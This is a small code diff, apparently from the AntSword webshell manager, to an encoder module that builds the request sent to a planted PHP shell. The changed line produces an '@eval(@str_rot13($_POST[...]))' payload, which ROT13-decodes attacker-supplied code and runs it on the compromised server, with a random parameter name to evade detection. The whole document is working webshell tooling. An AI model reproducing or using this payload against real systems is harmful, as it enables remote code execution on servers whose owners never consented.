@@ -27,7 +27,7 @@ module.exports = (pwd, data, ext = null) => {
     randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
   }
   data[randomID] = encode(data['_']);
-  data[pwd] = `@eval(@str_rot13($_POST[${randomID}]));`;
+  data[pwd] = `@eval(@str_rot13($_POST['${randomID}']));`;
   delete data['_'];
   return data;
 }
